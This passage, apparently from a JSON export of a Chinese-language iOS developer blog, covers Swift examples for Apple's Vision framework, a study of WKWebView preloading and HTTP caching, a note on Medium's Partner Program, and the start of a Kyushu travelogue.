ImageRequestHandler(fileURL)// parameter pack syntax and we must wait for all requests to finish before we can use their results.// let (barcodesObservation, textObservation, ...) = try await handler.perform(barcodesRequest, textRequest, ...)let (barcodesObservation, textObservation) = try await handler.perform(barcodesRequest, textRequest)iOS ≥ 18 performAll( ) 方法前面的 perform(barcodesRequest, textRequest) 處理 Barcode 掃描跟文字掃描的方式需要等到兩個 Request 都完成才能繼續執行；iOS 18 開始提供新的 performAll() 方法，將回應方式改為串流，在收到其中一個 Reqeust 結果是就能做對應處理，例如掃描到 Barcode 就直接響應。if #available(iOS 18.0, *) { // 新的使用 Swift 特性的 API var barcodesRequest = DetectBarcodesRequest() barcodesRequest.symbologies = [.ean13] // 如果只要掃描 EAN13 Barcode，可直接指定，提升效能 var textRequest = RecognizeTextRequest() textRequest.recognitionLanguages = [.init(identifier: \"zh-Hnat\"), .init(identifier: \"en-US\")] Task { let handler = ImageRequestHandler(fileURL) let observation = handler.performAll([barcodesRequest, textRequest] as [any VisionRequest]) for try await result in observation { switch result { case .detectBarcodes(_, let barcodesObservation): if let observation = barcodesObservation.first { DispatchQueue.main.async { self.infoLabel.text = observation.payloadString // 標記顏色 Layer let colorLayer = CALayer() // iOS &gt;=18 新的座標轉換 API toImageCoordinates // 未經測試，實際可能還需要計算 ContentMode = AspectFit 的位移: colorLayer.frame = observation.boundingBox.toImageCoordinates(self.baseImageView.frame.size, origin: .upperLeft) colorLayer.backgroundColor = UIColor.red.withAlphaComponent(0.5).cgColor self.baseImageView.layer.addSublayer(colorLayer) } print(\"BoundingBox: \\(observation.boundingBox.cgRect)\") print(\"Payload: \\(observation.payloadString ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology)\") } case .recognizeText(_, let textObservation): textObservation.forEach { observation in let topCandidate = observation.topCandidates(1).first print(topCandidate?.string ?? \"No text recognized\") } default: print(\"Unrecongnized result: \\(result)\") } } }}Optimize with Swift Concurrency假設我們有一個圖片牆列表，每張圖片都需要自動裁切出物件主體；這時候可以善用 Swift Concurrency 增加載入效率。原始寫法func generateThumbnail(url: URL) async throws -&gt; UIImage { let request = GenerateAttentionBasedSaliencyImageRequest() let saliencyObservation = try await request.perform(on: url) return cropImage(url, to: saliencyObservation.salientObjects)} func generateAllThumbnails() async throws { for image in images { image.thumbnail = try await generateThumbnail(url: image.url) }}一次只執行一個，效率、效能緩慢。優化 (1) — TaskGroup Concurrencyfunc generateAllThumbnails() async throws { try await withThrowingDiscardingTaskGroup { taskGroup in for image in images { image.thumbnail = try await generateThumbnail(url: image.url) } }}將每個 Task 都加入 TaskGroup Concurrency 執行。 問題：圖片辨識、截圖操作非常消耗記憶體性能，如果無節制狂加並行任務，可能造成使用者卡頓、OOM 閃退問題。優化 (2) — TaskGroup Concurrency + 限制並行數量func generateAllThumbnails() async throws { try await withThrowingDiscardingTaskGroup { taskGroup in // 最多執行數量不得超過 5 let maxImageTasks = min(5, images.count) // 先填充 5 個 Task for index in 0..&lt;maxImageTasks { taskGroup.addTask { image[index].thumbnail = try await generateThumbnail(url: image[index].url) } } var nextIndex = maxImageTasks for try await _ in taskGroup { // taskGroup 裡 Task await 完成時... // 檢查 Index 是否到尾部 if nextIndex &lt; images.count { let image = images[nextIndex] // 繼續逐個填充 Task (將維持在最多 5 個) taskGroup.addTask { image.thumbnail = try await generateThumbnail(url: image.url) } nextIndex += 1 } } }}Update an existing Vision app Vision 將在具備神經引擎的設備上移除對部分請求的 CPU 和 GPU 支持。在這些設備上，神經引擎是性能最好的選擇。可以使用 supportedComputeDevices() API 進行檢查 移除所有 VN 前綴VNXXRequest , VNXXXObservation -&gt; Reqeust , Observation 使用 async/await 取代原本的 VNRequestCompletionHandler 直接使用 *Request.perform() 取代原本的 VNImageRequestHandler.perform([VN*Request])Wrap-up 為 Swift 語言特性新設計的 API 新的功能、方法都為 Swift Only, iOS ≥ 18 可用 新的圖片評分功能、身體＋手部動作追蹤Thanks!KKday 招募工商👉👉👉本次讀書會分享源於 KKday App Team 組內每週技術分享活動， 目前團隊也正在熱情招募 Senior iOS Engineer ，有興趣的朋友歡迎投遞履歷 。👈👈👈參考資料Discover Swift enhancements in the Vision frameworkThe Vision Framework API has been redesigned to leverage modern Swift features like concurrency, making it easier and faster to integrate a wide array of Vision algorithms into your app. We’ll tour the updated API and share sample code, along with best practices, to help you get the benefits of this framework with less coding effort. We’ll also demonstrate two new features: image aesthetics and holistic body pose.Chapters 0:00 — Introduction 1:07 — New Vision API 1:47 — Get started with Vision 8:59 — Optimize with Swift Concurrency 11:05 — Update an existing Vision app 13:46 — What’s new in Vision?Vision framework Apple Developer Documentation-有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 619 Total Views Last Statistics Date: 2025-01-19 | 355 Views on Medium. " }, { "title": "Medium Partner Program 終於對全球(包含台灣)寫作者開放啦！", "url": "/posts/cefdf4d41746/", "categories": "ZRealm Life.", "tags": "medium, paywall, stripe, earnings, 生活", "date": "2024-08-10 17:09:15 +0800", "snippet": "Medium Partner Program 終於對全球(包含台灣)寫作者開放啦！所有人都可以加入 Medium Partner Program 撰寫文章獲得收益。Photo by Steve JohnsonMurmur經營 Medium 的初衷不是為了賺錢，是喜歡與大家分享的感覺，分享遇到的技術困難、希望能讓有同樣問題的開發者少走點彎路，或是基於我的研究再深入，我也可以從中學習到新知識；加...", "content": "Medium Partner Program 終於對全球(包含台灣)寫作者開放啦！所有人都可以加入 Medium Partner Program 撰寫文章獲得收益。Photo by Steve JohnsonMurmur經營 Medium 的初衷不是為了賺錢，是喜歡與大家分享的感覺，分享遇到的技術困難、希望能讓有同樣問題的開發者少走點彎路，或是基於我的研究再深入，我也可以從中學習到新知識；加上繁體中文寫作者很少，希望能拋磚引玉創造一個教學相長的循環風氣。所以一直對文章能不能獲利看得很淡，有也好、沒有也好，有的話可以拿盈利去實驗、購買更多服務或體驗，然後再轉寫成文章跟大家分享，可以創造一個滾動循環。從 2018 年開始在 Medium 寫文章就已經知道 Medium 有 Partner Program，但是 2018, 2019, 2020…一年過一年，Medium Partner Program 政策遲遲未有更新，一直都只限制幾個地區的寫作者 (我記得亞洲只有新加坡、日本…) 可以加入獲利；非上述地區的寫作者要獲利很 麻煩 ，需要 VPN 繞到允許的地區 + 需要該地區的帳戶或手機之類的，之前稍微研究過覺得太麻煩而且不安全。也因此很多創作者跳槽到其他平台，如 Matters, 方格子 或是自架放廣告獲利，這幾年 Medium 真的流失了許多中文創作者。Medium Partner Program直到最近 2024/08 無意間在 Medium 在後台的 Banner 喵到邀請我加入 Partner Program (我想說 What？又不開放台灣加入)，點進去看之後驚訝的發現，目前已經全開放了，幾乎所有地區的創作者都能加入 Partner Program，透過自已的文章一字一句獲得收益。 但說來有點好笑，要加入 Medium Partner Program 賺錢之前會需要你先花錢加入 Medium Member 付費會員(每個月最低 $4 美元)。2024–08–07 官方 Medium Blog 公告This post is behind Medium’s paywall, View the full post on Medium, converted by ZMediumToMarkdown.===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,532 Total Views Last Statistics Date: 2025-01-19 | 570 Views on Medium. " }, { "title": "iOS WKWebView 頁面與檔案資源 Preload 預載 / Cache 緩存研究", "url": "/posts/5033090c18ba/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, cache, webview, http-request", "date": "2024-07-28 17:53:05 +0800", "snippet": "iOS WKWebView 頁面與檔案資源 Preload 預載 / Cache 緩存研究iOS WKWebView 預先下載與緩存資源提升頁面載入速度研究。Photo by Antoine Gravier背景不知為何，一直跟 “Cache” 緩存蠻有緣的，之前也負責研究實踐過 AVPlayer 的「 iOS HLS Cache 實踐方法探究之旅 」與「 AVPlayer 實踐本地 Cach...", "content": "iOS WKWebView 頁面與檔案資源 Preload 預載 / Cache 緩存研究iOS WKWebView 預先下載與緩存資源提升頁面載入速度研究。Photo by Antoine Gravier背景不知為何，一直跟 “Cache” 緩存蠻有緣的，之前也負責研究實踐過 AVPlayer 的「 iOS HLS Cache 實踐方法探究之旅 」與「 AVPlayer 實踐本地 Cache 功能大全 」；不同於串流緩存目的是減少播放流量， 這次的主要任務是提升 In-app WKWebView 載入速度 ，其中也牽涉到 WKWebView 的預先加載與緩存研究；不過老實說 WKWebView 的場景更為複雜，不同於 AVPlayer 串流影音是一個或是多個連續的 Chunk 檔案，只需要針對檔案做 Cache，WKWebView 除了本身頁面檔案還有引入的資源檔案( .js, .css, font, image…) 再經由 Browser Engine 渲染出頁面呈現給使用者，這中間不是 App 可以控制的環節太多，從網路到前端頁面 JavaScript 語法效能、渲染方式，都需要花費時間。本篇文章只是就 iOS 技術上可行性進行研究，並不一定是最終解法，綜觀來說此議題還是請前端從前端下手比較能達成四兩撥千斤的效果 ，請前端夥伴優化第一個畫面出現的時間(First Contentful Paint) 與完善 HTTP Cache 機制，一方面能加速 Web/mWeb 自身，同時影響 Android/iOS in-app WebView 速度，並且也會提升 Google SEO 權重 。技術細節iOS 限制根據 Apple Review Guidelines 2.5.6 ： Apps that browse the web must use the appropriate WebKit framework and WebKit JavaScript. You may apply for an entitlement to use an alternative web browser engine in your app. Learn more about these entitlements .Apps 內只能使用 Apple 提供的 WebKit Framework (WKWebView) 不允許使用第三方或自行修改過的 WebKit 引擎 ，否則將不允許上架；另外 iOS 17.4 開始，為符合法規，歐盟地區可以在 取得 Apple 特別許可 後 使用其他 Browser Engine 。 蘋果不給的，我們也不能做。[未驗證] 查資料說就連 iOS 版的 Chrome, Firefox 也都是只能用 Apple WebKit (WKWebView)。另外還有一個很重要的事： WKWebView 是跑在 App 主執行緒之外的獨立執行緒，因此所有請求、操作都不會經過我們的 App。HTTP Cache Flow在 HTTP 協議中就有包含 Cache 協議，並且在所有跟網路有關的元件(URLSession, WKWebView…)當中系統都已經幫我們實作好了 Cache 機制，因此 Client App 這邊不需要做任何實現，也不推薦大家自己幹一套自己的 Cache 機制，直接走 HTTP 協議才是最快最穩定最有效的路。HTTP Cache 大致運作流程如上圖： Client 發起請求 Server 響應 Cache 策略在 Response Header，系統 URLSession, WKWebView… 會依照 Cache Header 自動幫我們將 Response 緩存下來，後續請求也會自動套用這個策略 再次請求相同資源時，如果緩存未過期則直接從記憶體、磁碟讀取本地緩存直接回應給 App 如果已過期(過期不代表無效)，則發起真實網路請求問 Server，如果內容沒更改 (雖過期待仍有效) Server 會直接回應 304 Not Modified (Empt Body)，雖然真的有發起網路請求但是基本上是毫秒回應＋無 Response Body 沒什麼流量耗損 如果內容有更改則重新給一次資料跟 Cache Header。 緩存除了本地 Cache、在 Network Proxy Server 或途經的路上也可能有網路的緩存。常見 HTTP Response Cache Header 參數：expires: RFC 2822 日期pragma: no-cache# 較新的參數:cache-control: private/public/no-store/no-cache/max-age/s-max-age/must-revalidate/proxy-revalidate...etag: XXX常見 HTTP Request Cache Header 參數：If-Modified-Since: 2024-07-18 13:00:00IF-None-Match: 1234 在 iOS 中網路有關的元件(URLSession, WKWebView…)會自己處理 HTTP Request/Response Cache Header 並自動做緩存，我們不需自己處理 Cache Header 參數。更詳細的 HTTP Cache 運作細節可參考「 Huli 大大寫的循序漸進理解 HTTP Cache 機制 」iOS WKWebView 總攬回到 iOS 上，因為我們只能使用 Apple WebKit，因此只能從蘋果提供的 WebKit 方法下手，探究有機會達成預載緩存的方式。上圖是使用 ChatGPT 4o 簡介的所有 Apple iOS WebKit (WKWebView) 相關的方法，並附上簡短說明；綠色部分為跟資料儲存有關的方法。跟大家分享其中比較幾個有趣的方法： WKProcessPool：可以讓多個 WKWebView 之間共享資源、數據、Cookie…等等。 WKHTTPCookieStore：可以管理 WKWebView Cookie，WKWebView 與 WKWebView 之間或是 App 內的 URLSession Cookie 與 WKWebView。 WKWebsiteDataStore：管理網站緩存檔案。(只能讀資訊跟清除) WKURLSchemeHandler：當 WKWebView 無法認得處理的 URL Scheme 則可註冊自定義 Handler 處理。 WKContentWorld：可以把注入的 JavaScript (WKUserScript) 腳本分組管理。 WKFindXXX：可以控制頁面搜尋功能。 WKContentRuleListStore：可以在 WKWebView 內實現內容阻擋器功能(e.g. 遮擋廣告之類的)。iOS WKWebView 預載緩存可行性方案研究完善 HTTP Cache ✅如同前文介紹的 HTTP Cache 機制，我們可以請 Web Team 完善活動頁面的 HTTP Cache 設定，Client iOS 這邊只需要簡單的檢查一下 CachePolicy 設定就好，其他的事系統都做好了！CachePolicy 設定URLSession:let configuration = URLSessionConfiguration.defaultconfiguration.requestCachePolicy = .useProtocolCachePolicylet session = URLSession(configuration: configuration)URLRequest/WKWebView:var request = URLRequest(url: url)request.cachePolicy = .reloadRevalidatingCacheData//wkWebView.load(request) useProtocolCachePolicy : 默認，照默認 HTTP Cache 控制。 reloadIgnoringLocalCacheData : 不使用本地快取，每次請求都從網絡加載數據(但允許網路, Proxy 快取…)。 reloadIgnoringLocalAndRemoteCacheData : 無論本地或遠端快取，總是從網絡加載數據。 returnCacheDataElseLoad : 如果有快取數據則使用快取數據，否則從網絡加載數據。 returnCacheDataDontLoad : 僅使用快取數據，如果沒有快取數據也不打網路請求。 reloadRevalidatingCacheData : 發送請求檢查本地快取是否過期，如果沒有過期(304 Not Modified)則使用快取數據，否則從網絡重新加載數據。設定快取大小App 全域:let memoryCapacity = 512 * 1024 * 1024 // 512 MBlet diskCapacity = 10 * 1024 * 1024 * 1024 // 10 GBlet urlCache = URLCache(memoryCapacity: memoryCapacity, diskCapacity: diskCapacity, diskPath: \"myCache\") URLCache.shared = urlCache個別 URLSession:let memoryCapacity = 512 * 1024 * 1024 // 512 MBlet diskCapacity = 10 * 1024 * 1024 * 1024 // 10 GBlet cache = URLCache(memoryCapacity: memoryCapacity, diskCapacity: diskCapacity, diskPath: \"myCache\") let configuration = URLSessionConfiguration.defaultconfiguration.urlCache = cache 另外同前述，WKWebView 是跑在 App 主執行緒之外的獨立執行緒，因此 URLRequest, URLSession 的快取跟 WKWebView 的是不共用的。如何在 WKWebView 中使用 Safari 開發者工具?檢查是否是使用本地 Cache 快取。Safari 啟用開發者功能：WKWebView 啟用 isInspectable：func makeWKWebView() -&gt; WKWebView { let webView = WKWebView(frame: .zero) webView.isInspectable = true // is only available in ios 16.4 or newer return webView}WKWebView 加上 webView.isInspectable = true 才能在 Debug Build 版使用 Safari 開發者工具。p.s. 這是我另開的測試 WKWebView 用 Project在 webView.load 的地方下一個斷點。開始測試：Build &amp; Run：執行到 webView.load 斷點時，點擊「逐行偵錯」。回到 Safari，選擇工具列的「開發」-&gt;「模擬器」-&gt;「你的專案」-&gt;「about:blank」。 因為頁面尚未開始載入 所以網址會是 about:blank 如果沒出現 about:blank 就再回到 XCode 點一次逐行偵錯按鈕，直到出現為止出現該頁面對應的開發者工具：回 XCode 點擊繼續執行：再回到 Safari 開發者工具就能看到資源載入狀況跟完整的開發者工具功能了 (元件、儲存空間調試…等等)如果網路資源有 HTTP Cache，傳算大小則會顯示「磁碟」：點進去也能看到緩存資訊。清除 WKWebView 快取// Clean CookiesHTTPCookieStorage.shared.removeCookies(since: Date.distantPast)// Clean Stored Data, Cache Datalet dataTypes = WKWebsiteDataStore.allWebsiteDataTypes()let store = WKWebsiteDataStore.default()store.fetchDataRecords(ofTypes: dataTypes) { records in records.forEach { record in store.removeData( ofTypes: record.dataTypes, for: records, completionHandler: { print(\"clearWebViewCache() - \\(record)\") } ) }}可使用以上方法清除 WKWebView 已緩存的資源、本地數據、Cookie 數據。 但完善 HTTP Cache 只是做到緩存部分(第二次進入很快)，預載(第一次進入)不會有影響。 ✅完善 HTTP Cache + WKWebView Preload 全頁面 😕class WebViewPreloader { static let shared = WebViewPreloader() private var _webview: WKWebView = WKWebView() private init() { } func preload(url: URL) { let request = URLRequest(url: url) Task { @MainActor in webview.load(request) } }}WebViewPreloader.shared.preload(\"https://zhgchg.li/campaign/summer\")基於完善 HTTP Cache 之後，第二次 Load WKWebView 會有緩存，我們可以先在列表或首頁偷先把裡面的 URL 都 Load 過一次讓他有緩存，使用者進去之後就會比較快。 經過測試，原理上可行；但是對性能、網路流量損耗太大 ；使用者可能根本沒進去詳細頁，但我們為了做預載把所有頁面全都 Load 了一遍，有點亂槍打鳥的感覺。 個人認為現實上不可行，且利大於弊、因噎廢食。😕完善 HTTP Cache + WKWebView Preload 純資源🎉基於上面方法的優化，我們可以搭配 HTML Link Preload 方法，僅針對頁面裡面會用到的資源檔案(e.g. .js, .css, font, image…)進行 Preload，讓使用者進去之後可以直接使用緩存資源，不用再發起網路請求拿資源檔案。 意即我不預載整個頁面的所有東西了，我只預載頁面會用到的資源檔案，這些檔案可能也是跨頁面共用的；頁面檔案 .html 還是從網路拿取再結合預載檔案渲染出頁面。請注意：這邊依然走的是 HTTP Cache，因此這些資源也要支援 HTTP Cache，否則之後請求還是會走網路。請注意：這邊依然走的是 HTTP Cache，因此這些資源也要支援 HTTP Cache，否則之後請求還是會走網路。請注意：這邊依然走的是 HTTP Cache，因此這些資源也要支援 HTTP Cache，否則之後請求還是會走網路。&lt;!DOCTYPE html&gt;&lt;html lang=\"zh-tw\"&gt; &lt;head&gt; &lt;link rel=\"preload\" href=\"https://cdn.zhgchg.li/dist/main.js\" as=\"script\"&gt; &lt;link rel=\"preload\" href=\"https://image.zhgchg.li/v2/image/get/campaign.jpg\" as=\"image\"&gt; &lt;link rel=\"preload\" href=\"https://cdn.zhgchg.li/assets/fonts/glyphicons-halflings-regular.woff2\" as=\"font\"&gt; &lt;link rel=\"preload\" href=\"https://cdn.zhgchg.li/assets/fonts/Simple-Line-Icons.woff2?v=2.4.0\" as=\"font\"&gt; &lt;/head&gt;&lt;/html&gt;常見支援檔案類型： .js script .css style font imageWeb Team 將以上 HTML 內容放在與 App 約定好的路徑，我們的 WebViewPreloader 改去 Load 這個路徑，WKWebView Load 的同時就會解析 &lt;link&gt; preload 資源產生緩存了。WebViewPreloader.shared.preload(\"https://zhgchg.li/campaign/summer/preload\")// or 統一都在WebViewPreloader.shared.preload(\"https://zhgchg.li/assets/preload\") 經過測試，可以在流量損耗與預載中取得一個不錯的平衡 。 🎉 缺點應該是需要維護這份 Cache 資源列表，跟還是需要 Web 優化頁面渲染跟載入，不然第一個頁面出現的體感時間依然會很久。URLProtocol ❌另外想到我們的老朋友 URLProtocol ，所有基於 URL Loading System 的請求 (URLSession, openURL…) 都可以被攔截下來操作。class CustomURLProtocol: URLProtocol { override class func canInit(with request: URLRequest) -&gt; Bool { // 判斷是否要處理這個請求 if let url = request.url { return url.scheme == \"custom\" } return false } override class func canonicalRequest(for request: URLRequest) -&gt; URLRequest { // 返回請求 return request } override func startLoading() { // 處理請求並加載數據 // 改成緩存策略，先從本地讀檔案 if let url = request.url { let response = URLResponse(url: url, mimeType: \"text/plain\", expectedContentLength: -1, textEncodingName: nil) self.client?.urlProtocol(self, didReceive: response, cacheStoragePolicy: .notAllowed) let data = \"This is a custom response!\".data(using: .utf8)! self.client?.urlProtocol(self, didLoad: data) self.client?.urlProtocolDidFinishLoading(self) } } override func stopLoading() { // 停止加載數據 }}// AppDelegate.swift didFinishLaunchingWithOptions:URLProtocol.registerClass(CustomURLProtocol.self)抽象想法是在背景偷發 URLReqeust -&gt; URLProtocol -&gt; 從中自己下載所有資源，使用者 -&gt; WKWebView -&gt; Request -&gt; URLProtocol -&gt; 回應預載的資源。 一樣同前述，WKWebView 是跑在 App 主執行緒之外的獨立執行緒，因此 URLProtocol 是攔截不到 WKWebView 的請求的。 但聽說上黑魔法好像可以，不推薦、會延伸其他問題(送審被拒) 此路不通 ❌。WKURLSchemeHandler 😕蘋果在 iOS 11 推出的新方法，感覺是為了補足 WKWebView 無法使用 URLProtocol 的特型；但是這個方法跟 AVPlayer 的 ResourceLoader 比較類似， 只有系統無法辨識的 Scheme 才會丟給我們自己訂的 WKURLSchemeHandler 進行處理 。抽象想法一樣是在背景偷發 WKWebView -&gt; Request -&gt; WKURLSchemeHandler -&gt; 從中自己下載所有資源，使用者 -&gt; WKWebView -&gt; Request -&gt; WKURLSchemeHandler -&gt; 回應預載的資源。import WebKitclass CustomSchemeHandler: NSObject, WKURLSchemeHandler { func webView(_ webView: WKWebView, start urlSchemeTask: WKURLSchemeTask) { // 處理自定義 let url = urlSchemeTask.request.url! if url.scheme == \"custom-scheme\" { // 改成緩存策略，先從本地讀檔案 let response = URLResponse(url: url, mimeType: \"text/html\", expectedContentLength: -1, textEncodingName: nil) urlSchemeTask.didReceive(response) let html = \"&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hello from custom scheme!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;\" let data = html.data(using: .utf8)! urlSchemeTask.didReceive(data) urlSchemeTask.didFinish() } } func webView(_ webView: WKWebView, stop urlSchemeTask: WKURLSchemeTask) { // 停止 }}let webViewConfiguration = WKWebViewConfiguration()webViewConfiguration.setURLSchemeHandler(CustomSchemeHandler(), forURLScheme: \"mycacher\")let customURL = URL(string: \"mycacher://zhgchg.li/campaign/summer\")!webView.load(URLRequest(url: customURL)) 因為 http/https 是系統能處理的 Scheme 所以我們不能自定義 http/https 的處理；需要把 Scheme 換成系統認不得的 Scheme (e.g. mycacher:// )。 頁面裡面統一都要用相對路徑才會自動套上 mycacher:// 讓我們的 Handler 捕獲。 如果不想改 http/https 又想獲取 http/https 請求只能上黑魔法， 不推薦、 會延伸其他問題(送審被拒) 自行緩存頁面檔案並響應，頁面中使用的 Ajax, XMLHttpRequest, Fetch 請求可能會被 CORS 同源政策 阻擋 ，要降低網站安全性才能使用 (因為會變成 mycacher:// 發送請求打 http://zhgchg.li/xxx，不同源) 可能需要自己實現 Cache Policy，例如那何時該更新？有效多久？ (這就跟 HTTP Cache 在做的事一樣了) 綜合以上，雖然原理上可行，但是實現上投入巨大；整體來說不符合效益並且很難擴充跟保持穩定性 😕感覺 WKURLSchemeHandler 這方法比較適合針對網頁內有很大的資源檔案需要下載，宣告一個自訂的 Scheme 丟給 App 去處理，互相合作渲染出網頁。橋接 WKWebView 網路請求改由 App 發送 🫥WKWebView 改成打 App 定好的接口 (WkUserScript) 替代 Ajax, XMLHttpRequest, Fetch，由 App 去請求資源。 以此案例幫助不大，因為是第一個畫面出現的時間太慢，而不是後續加載太慢；並且此方法會造成 Web x App 有過深根奇怪的依賴關係 🫥從 Service Worker 下手 ❌ 基於安全性問題，只有蘋果自己的 Safari App 支援，WKWebView 不支援❌。WKWebView 性能優化 🫥優化提升 WKWebView Load View 的性能。 WKWebView 本身像是骨架、Web 頁面是血肉，研究下來優化骨架(e.g. 復用 WKProcessPool)的效果很有限，可能是 0.0003 -&gt; 0.000015 秒的區別。Local HTML, Local 資源檔案 🫥類似 Preload 方式，只是改成將活動頁放入 App Bundle 或是啟動時從遠端拿。 放整個 HTML 頁面可能也會遇到 CORS 同源問題；純放網頁資源檔案感覺可以使用 「完善 HTTP Cache + WKWebView Preload 純資源」方式取代；放 App Bundle 徒增 App Size、從遠端拿就是 WKWebView Preload 🫥前端優化下手 🎉🎉🎉Source: wedevs參考 wedevs 優化建議 ，前端 HTML 頁面應該會有四個載入階段，從一開始載完頁面檔案 ( .html) First Paint (空白頁) 到 First Contentful Paint (渲染出頁面骨架) 再到 First Meaningful Paint (補上頁面內容) 到 Time To Interactive(最後可讓使用者互動)。用我們的頁面測試；瀏覽器、WKWebView 會先請求頁面本體 .html 再載入需要用到的資源，同時依照程式指引構建出畫面給使用者，對比文章發現頁面階段其實只有 First Paint (空白)到 Time To Interactive (First Contentful Paint 只有 Navigation Bar 應該不太算…)，少了中間的分階段渲染給使用者，因此使用者整體等待時間會拉長。 並且目前只有資源類的檔案有設定 HTTP Cache，頁面本體沒有。另外也可以參考 Google PageSpeed Insights 建議進行優化，例如壓縮、減少腳本大小. .等等 因為 in-app WKWebView 的核心還是 Web 頁面本身；因此從前端網頁下手調整是個很好的四兩撥千斤方式 。🎉🎉🎉使用者體驗下手 🎉🎉🎉 一個簡單的實現，從使用者體驗下手，增加 Loading Progress Bar，不要只展示空白頁面讓使用者不知所措，讓他知道頁面正在加載中並且進度到哪裡。🎉🎉🎉結論以上就是本次探究 WKWebView 預載與緩存可行方案的一些發想研究，技術反而不是最大的問題，重點還是選擇，哪些方式才是對使用者最有效對開發端投入成本最低的方案，選擇這些方式可能小小改了些地方就能直接達成目標；選擇錯誤的方式會導致投入巨大的資源繞圈圈並且很有可能在後續難以維護跟使用。 辦法總比困難多，有時候是缺少想像。說不定也有我沒想到的神級組合做法，歡迎大家協助補充。參考資料WKWebView Preload 純資源🎉 方案可參考以下影片另外作者也有提到 WKURLSchemeHandler 的方法。影片中的完整 Demo Repo 如下：iOS 老司機週報老司機週報中關於 WkWebView 的分享也值得一看。雜談久違的回歸撰寫 iOS 開發相關長篇文章。有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 892 Total Views Last Statistics Date: 2025-01-19 | 820 Views on Medium. " }, { "title": "遊記 2024 二訪九州 9 日自由行，經釜山→博多郵輪入境", "url": "/posts/cb65fd5ab770/", "categories": "Z 度旅行遊記", "tags": "生活, japan, travel, fukuoka, travel-writing", "date": "2024-06-21 01:17:26 +0800", "snippet": "[遊記] 2024 二訪九州 9 日自由行，經釜山→博多郵輪入境韓國釜山搭乘新山茶花號郵輪入境日本博多，遊歷由布院、大分、福岡、下關、絲島、佐世保；共 11 日背景趁著結束階段性工作任務到新工作的短暫期間，再去日本走走透透氣；5/30 離職、6/3 出發、6/13 回程、6/24 新工作到職，時間抓得剛好，因是工作轉換空擋才能去比較長的時間(合計 11 天)；這次是偽獨旅，跟去年一起去 東京...", "content": "[遊記] 2024 二訪九州 9 日自由行，經釜山→博多郵輪入境韓國釜山搭乘新山茶花號郵輪入境日本博多，遊歷由布院、大分、福岡、下關、絲島、佐世保；共 11 日背景趁著結束階段性工作任務到新工作的短暫期間，再去日本走走透透氣；5/30 離職、6/3 出發、6/13 回程、6/24 新工作到職，時間抓得剛好，因是工作轉換空擋才能去比較長的時間(合計 11 天)；這次是偽獨旅，跟去年一起去 東京 的 James Lin (Ex-Binance Android Developer, 有工作機會歡迎介紹給他)組隊；這是我第二次造訪九州， 去年 9 月第一次來九州 去了福岡、熊本、長崎 的必訪景點；這次主要補上上次沒去到的地方；所以行程上會跟 James 不同，分頭行動。以下是上次去過的景點這次不一定會再去，有興趣了解更多九州的朋友請參考我上一篇遊記「 2023 九州 10 日自由行獨旅 」： 福岡：門司港、小倉城、櫛田神社、住吉神社、中洲屋台、福岡塔、Pay Pay Dome、天神逛街、博多運河城、Lalaport、柳川游船、太宰府 長崎：中華街、哥巴拉園、稻佐山夜景、原爆資料館、和平公園 熊本：熊本城、阿蘇中岳、阿蘇神社、水前寺承趣園、鶴舞百貨、上通商店街、下通商店街、加藤神社、櫻町百貨、熊本熊廣場（部長辦公室） 以上，請參考 2023 九州 10 日自由行獨旅 。此行學到的事一樣把總結此行學到的事寫在前面，「自由行就是不斷地繳學費(花時間或金錢)學習，經驗多了會踩的坑也越來越少」。 在 JR 無任何電子看板的小站，要看月台公佈欄的時刻表確定列車停靠月台。 ⚠️ 在 JR 部分無站長的小站，要下車要到第一節車廂(車長兼站長、類似公車下車的方式) JR 特急跟一般票是分開的，買完一般要加買特急才能搭特急；直接搭會被要求補票。(JR Pass 就不用管，可無腦搭乘) JR 特急幾乎 100% 會遇到查票，搭自由座的話車長會多問你要去哪，方便紀錄 JR Pass 有線上提前預約的話 (需刷信用卡支付劃位費用)，兌換 JR Pass 時會需要出示同一張信用卡進行驗證，所以務必要帶那張卡去日本 ⚠️ 新山茶花號太晚訂就只有經濟通鋪 (8–11 人男女混睡、只有日式公共澡堂、晚上 11 點熄燈) 由布院之森太晚訂沒位子，只能搭一般的由布 JR 高千穗峽谷划船需要提早預訂 JR Pass 有兩班新幹線不能搭乘： 「希望(Nozomi)號」、「瑞穗(Mizuho)號」，要另外買票 JR Pass 進出博多站的新幹線票口有時候會卡住，需要走人工(因為上述兩班不能搭乘，只要確認你不是搭這兩班，站務人員就會放行) 訂票都要確認一下，這次遇到訂新山茶花號的時候性別出錯，當天趕快聯絡客服協助修正。 ⚠️(後來發現是男女混住應該沒差，但還是嚇了一大跳) 九州公車不一定準時、Google Map 指示也不一定準確 日本行李寄物 Coin Lockers 查詢、預約 ( 但不是所有，很多可寄物的地方上面沒有 ) 韓國要轉接頭 韓幣只能臨櫃換 韓國可以只買 tmoney 交通卡，不需 WowpassKKday 推廣 日本 JR PASS｜九州地區鐵路周遊券｜北九州＆南九州＆全九州｜電子票 日本長崎|九州豪斯登堡門票 Huis Ten Bosch 日本福岡|博多港ー釜山港・客貨郵輪「新山茶花號」Camellia Line 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 福岡西鐵｜太宰府 天滿宮+柳川遊船 觀光暢遊套票｜福岡機場國際線領取 日本福岡teamLab Forest 福岡門票 — SBI 證券｜立即確認 【一人成團】日本九州一日遊｜高千穗峽＆天岩戸神社＆天安河原（含特色阿蘇赤牛烤肉套餐）｜福岡出發 九州熊本一日遊｜阿蘇中岳火山・草千里・熊本城・水前寺成趣園／季節水果吃到飽｜福岡博多出發（中英日對應）準備工作樂此行主要是去踩 韓國釜山到日本福岡(博多)的新山茶花號郵輪 跟由布院(湯布院)、大分別府、宮崎縣-高千穗。行前計畫如下：(出發前一天才規劃好， 實際順序不一定照計劃 、南阿蘇太遠後來沒去) 6/3 約 19:00 抵達釜山-金海機場，20:00 到釜山站、飯店 Check-in 附近覓食 6/4 海東龍宮寺、海雲台、晚上出境韓國、搭 新山茶花號郵輪 6/5 抵達福岡、去唐津往上去七釜、往下去祐德稻荷神社、大魚神社海中鳥居、回程經 Lalaport實際：只去祐德稻荷神社 6/6 早上搭成 JR 